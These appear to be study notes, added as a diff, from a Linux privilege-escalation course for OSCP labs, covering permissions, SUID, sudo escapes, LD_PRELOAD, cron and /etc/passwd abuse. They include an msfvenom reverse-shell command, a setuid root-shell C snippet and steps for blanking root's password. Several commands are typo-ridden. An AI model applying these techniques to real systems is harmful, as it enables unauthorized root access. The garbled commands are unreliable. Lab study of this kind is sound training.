@@ -1,1 +1,422 @@
 https://www.udemy.com/course/linux-privilege-escalation
+
+Linux Privilege Escalation for OSCP & Beyond!
+
+About Instructor:
+Penetration tester for 7 yrs
+Used Linux/*nix for 13 yrs
+OSCP Certified
+Creator of AutoRecon
+Admin of "InfoSec Prep" Discord server
+
+Course Overview
+Course will focus on privilege escalation techniques in Linux and *nix systems. You will learn:
+How basic user privileges work in linux.
+Multiple methods for escalating your user's privileges.
+Why and how these methods work.
+Tools you can use to identify potential escalation paths.
+
+Prerequisites
+A basic understanding of Linux systems would be desirable, though the course will cover some aspects. This course assumes that you have fully working low-privileged shell on a Linux system, and will not cover obtaining one (this is a post-exploitation course).
+
+Setup 
+This course will be using the Debian VM from the following workshop:
+
+https://github.com/sagishahar/lpeworkshop
+
+The Debian VM has been intentionally misconfigured with numerous privilege escalation methods.
+
+You can download the VM from the Udemy course page. 
+
+The version on Udemy includes a few new methods of privilege escalation. It is recommended that you use this VM for the course. 
+
+The "user" account password is: password321
+The "root" account password is: password123
+
+If for some reason you need to use the original VM, or perhaps you already have it set up, there is a Bash script which integrates a few more mis configurations into the VM: 
+https://github.com/Tib3rius/privesc-setup
+
+Disclaimer
+This course was designed with the OSCP labs and exam in mind, however it attempts to cover a wide range of escalation techniques beyond what an OSCP student is expected to understand. 
+
+Understanding that privilege escalation is often highly complex, and new techniques are developed over time, this course is not intended to be a "complete" guide to every privilege escalation technique.
+
+When appropriate, the author will update the course material to include new techniques which are considered to be valuable. 
+
+Acknowledgments
+Sagi Shahar, for creating the Debian VM and privilege escalation workshop, and licensing it such that it could be used in this course. 
+
+Showeet.com, for licensing the presentation template used in this course. 
+
+Devand MacLean, for reviewing the course and suggesting several improvements.
+
+
+Privilege Escalation in Linux
+
+General Concepts
+Our ultimate goal with privilege escalation in Linux is to gain a shell running as the root user. 
+
+Privilege escalation can be simple (e.g. a kernel exploit) or require a lot of reconnaissance on the compromised system.
+
+In a lot of cases, privilege escalation may not simply rely on a single misconfiguration, but may require you to think, and combine multiple misconfiguration. 
+
+All privilege escalations are effectively examples of access control violations.
+
+Access control and user permissions are intrinsically linked. 
+
+When focusing on privilege escalations in Linux, understanding how Linux permissions is very important.
+
+Understanding Permissions in Linux
+Users, Groups, and Files & Directories
+
+At a basic level, permissions in Linux are a relationship between users, groups, and files & directories. 
+
+Users can belong to multiple groups.
+
+Groups can have multiple users.
+
+Every file and directory defines its permissions in terms of a user, a group, and "others" (all other users).
+
+Users
+
+User accounts are configured in the /etc/passwd file.
+User password hashes are stored in the /etc/shadow file.
+Users are identified by an integer user ID (UID)
+The "root" user account is a special type of account in Linux. It has a UID of 0, and the system grants this user access to every file.
+
+Groups
+
+Groups are configured in the /etc/group file.
+Users have a primary group, and can have multiple secondary (or supplementary) groups.
+By default, a user's primary group has the same name as their user account.
+
+Files & Directories
+
+All files & directories have a single owner and a group.
+Permissions are defined in terms of read, write, and execute operations.
+There are three sets of permissions, one for the owner, one for the group, and one for all "other" users (can be referred to as "world").
+Only the owner can change permissions.
+
+File Permissions
+
+File permissions are self explanatory:
+-Read - when set, the file contents can be read.
+-Write - when set, the file contents can be modified.
+-Execute - when set, the file can be executed (i.e. run as some kind of process).
+
+Directory Permissions
+
+Directory permissions are slightly more complicated:
+-Execute - when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
+-Read - when set, the directory contents can be listed. 
+-Write - when set, files and subdirectories can be created in the directory. 
+
+Special Permissions
+
+setuid (SUID) bit
+-When set, files get executed with the privileges of the file owner.
+
+setgid (SGID) bit
+-When set ona  file, the file will get executed with the privileges of the file group. When set on a directory, files created within that directory will inherit the group of the directory itself.
+
+Viewing Permissions:
+
+The ls command can be used to view permissions:
+$ ls -l /bin/date
+-rwxr-xr-x 1 root root 60416 Apr 28 2010 /bin/date
+
+The first 10 characters indicate the permissions set on the file or directory.
+The first character simply indicates the type (e.g. '-' for file, 'd' for directory).
+
+Viewing Permissions
+
+The remaining 9 character represents the 3 sets of permissions (owner, group, others).
+Each set contains 3 characters, indicating the read (r), write (w), and execute (x) permissions. 
+
+SUID/SGID permissions are represented by the 's' in the execute position.
+
+Real, Effective, and Saved UID/GID
+
+It was previously stated that user are identified by a user ID.
+In fact, each user has 3 user IDs in Linux (real, effective, and saved).
+A user's real ID is who they actually are (the ID defined in /etc/passwd). Ironically, the real ID is actually used less often to check a user's identity.
+
+A user's effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user's real ID. 
+
+The effective ID is used in most access control decisions to verify a user, and commands such as whoami use the effective ID. 
+
+Finally, the saved ID is used to ensure that SUID processes can temporarily switch a user's effective ID back to their real ID and back again without losing track of their original effective ID. 
+
+Print real and effective user/group IDs:
+id
+
+Print real, effective, saved, and file system user/group IDs of the current process (i.e. our shell):
+ca /proc/$$/status | grep "[UG]id"
+
+Spawning Root Shells
+
+As stated in the introduction to this course, our ultimate goal is to spawn a root shell.
+
+While the end result is the same (executing /bin/sh or /bin/bash), there are multiple ways of achieving this execution.
+
+In this course, we will use a variety of methods. This section highlights a few which can be used in situations where commands can be executed as root. 
+
+"rootbash" SUID
+
+One of my favorite ways to spawn a root shell is to create a copy of the /bin/bash executable file (I usually rename it rootbash), make sure it is owned by the root user, and has the SUID bit set. 
+
+A root shell can be spawned by simply executing the rootbash file with the -p command line option.
+
+The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times).
+
+Custom Executable
+
+There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled will spawn a Bash shell running as root:
+
+init main() {
+	setuid(0);
+	system("bin/bash -p");
+}
+
+Compile using:
+$ gcc -i <name> <filename.c>
+
+msfvenom
+
+Alternatively, if reverse shell is preferred, msfvenom can be used to generate an executable (.elf) file:
+
+$msfvenoom -p linudx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+
+This reverse shell can be caught using netcat or Metasploit's own multi/handler.
+
+Native Reverse Shells
+
+There are multiple ways to spawn reverse shells natively on many linux distributions.
+
+A good tool for suggesting these is:
+https://github.com/mthbernardes/rsg
+
+All can be caught using a simple netcat listener.
+
+Privilege Escalation Tools
+
+Why use tools?
+Tools can allow us to automate the reconnaissance that can identify potential privilege escalations.
+
+While it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam.
+
+In this course will will use Linux Smart Enumeration and LinEnum.
+
+Linux Smart Enumeration
+
+Linux Smart Enumeration (lse.sh) has recently become my personal favorite privilege escalation tool.
+
+In addition to being a Bash script (which helps if Python isn't installed), it has multiple levels which gradually reveal more and more information.
+
+https://github.com/diego-treitos/linux-smart-enumeration
+
+LinEnum
+LinEnum is an advanced Bash Script which extracts a large amount of useful information from the target system. 
+
+It can copy interesting files for export, and search for files containing a keyword (e.g. "password").
+
+https://github.com/rebootuser/LinEnum
+
+Other Tools
+While we won't use these tools in the course, feel free to experiment with them:
+
+https://github.com/linted/linuxprivchecker
+https://github.com/AlessandroZ/BeRoot
+https://pentestmonkey.net/tools/audit/unix-privesc-check (risky zip)
+
+Kernel Exploits
+
+What is a Kernel?
+
+Kernels are the core of any operating system.
+
+Think of it as a layer between application software and the actual computer hardware.
+
+The kernel has complete control over the operating system.
+
+Exploiting a kernel vulnerability can result in execution as the root user.
+
+Finding Kernel Exploits
+
+Finding and using kernel exploits is usually a simple process:
+1. Enumerate kernel version (uname -a).
+2. Find matching exploits (Google, ExploitDB, GitHub). 
+3. Compile and run.
+
+Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.
+
+Service Exploits
+
+Services are simply programs that run in the background, accepting input or performing regular tasks.
+
+If vulnerable services are running as root, exploiting them can lead to command execution as root. 
+
+Service exploits can be found using Searchsploit, Google, and GitHub, just like with Kernel exploits.
+
+Enumerating Program Versions
+
+Running the program with the --version/-v command line option often shows the version number:
+
+$ <program> --version
+$ <program> -v
+
+On Debian-like distributions, dpkg can show installed programs and their version:
+
+$ dpkg -l | grep <program>
+
+On systems that use rpm, the following achieves the same:
+$ rpm -qa | grep <program>
+
+Port Forwarding
+
+In some instances, a root process may be bound to an internal port, through which it communicates.
+
+If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:
+
+$ ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machine>
+
+The exploit code can now be run on your local machine at whichever port your chose.
+
+Weak File Permissions
+
+Certain system files can be taken advantage of to perform privilege escalation if the permissions on them are too weak.
+
+If a system file has confidential information we can read, it may be used to gain access to the root account.
+
+If a system file can be written to, we may be able to modify the way the operating system works and gain access that way. 
+
+/etc/shadow
+
+The /etc/shadow file contains user password hashes, and by default is not readable by any user except for root. 
+If we are able to read the contents of the /etc/shadow file, we might be able to crack the root user's password hash. 
+If we are able to modify the /etc/shadow file, we can replace the root user's password hash with one know. 
+
+/etc/passwd
+
+The /etc/passwd historically contained user password hashes.
+For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over he hash in /etc/shadow.
+
+If we can write to /etc/passwd, we can easily enter a known password hash for the root user, and then use the su command to switch to the root user.
+
+Alternatively, if we can only append the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different.
+
+/etc/passwd
+The root account in /etc/passwd is usually configured like this:
+
+root:x:0:0:root:/root:/bin/bash
+
+The "x" in the second field instructs Linux to look for the password hash in the /etc/shadow file.
+
+In some versions of Linux, it is possible to simply delete the "x", which Linux interprets as the user having no password:
+
+root::0:0:root:/root:/bin/bash
+
+Backups
+
+Even if a machine has correct permissions on the important or sensitive files, a user may have created backups of these files.
+
+It is always worth exploring the file system looking for readable backup files. Some common place include user home directories, the / (root) directory, /tmp, and /var/backups.
+
+Sudo
+
+What is sudo?
+
+sudo is a program which lets users run other programs with the security privileges of other users. By default, that other user will be root. 
+
+A user generally needs to enter their password to use sudo, and they must be permitted access via rule(s) in the /etc/sudoers file.
+
+Rules can be used to limit users to certain programs, and forgo the password entry requirements. 
+
+Useful Commands
+
+Run a program using sudo:
+$ sudo <program>
+
+Run a program as a specific user:
+$ sudo -u <username> <program>
+
+List programs a user is allowed (and disallowed) to run:
+$ sudo -l
+
+Known Password
+
+By far the most obvious privilege escalation with sudo is to use sudo as it was intended!
+
+If your low privileged user account can use sudo unrestricted (i.e. you can run any programs) as you know the user's password, privilege escalation is easy, by using the "switch user" (su) command to spawn a root shell:
+$ sudo su
+
+Shell Escape Sequences
+
+Even if we are restricted to running certain programs via sudo, it is sometimes possible to "escape" the program and spawn a shell. 
+
+Since the initial program runs with root privileges, so does the spawned shell.
+
+A list of programs with their shell escape sequences can be found here: https:gtfobins.github.io
+
+Abusing Intended Functionality 
+
+If a program doesn't have an escape sequence, it may still be possible to use it to escalate privileges. 
+
+If we can read files owned by root, we may be able to extract useful information (e.g. passwords, hashes, keys). 
+
+If we can write to files owned by root, we may be able to insert or modify information. 
+
+Environment Variables
+
+Programs run through sudo can inherit the environment variables from the user's environment.
+
+In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment.
+
+The env_keep option can be used to keep certain environment variables from the user's environment. 
+
+The configured options are displayed when running sudo -l
+
+LD_PRELOAD
+
+LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. 
+
+When set, the shared object will be loaded before any others.
+
+By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded. 
+
+Limitations
+
+LD_PRELOAD will not work if the real user ID is different from the effective user ID. 
+
+sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option.
+
+LD_LIBRARY_PATH
+
+The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first. 
+
+The ldd command can be used to print the shared libraries used by a program:
+$ ldd /usr/sbin/apache2
+
+By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead. 
+
+Cron Jobs
+
+Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 
+
+Cron jobs run with the security level of the user who owns them. 
+
+By default, cron jobs are running using the /bin/sh shell, with limited environment variables. 
+
+Cron table files (contabs) store the configuration for cron jobs. 
+
+User crontabs are usually located in /var/spool/cron/ or /var/spool/cron/crontabs/
+
+The system-wide crontab is located at /etc/crontab.
+
+File Permissions
+
+Misconfiguration of file permissions associated with cron jobs can lead to easy privilege escalation. 
+
+
+If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code. 
+
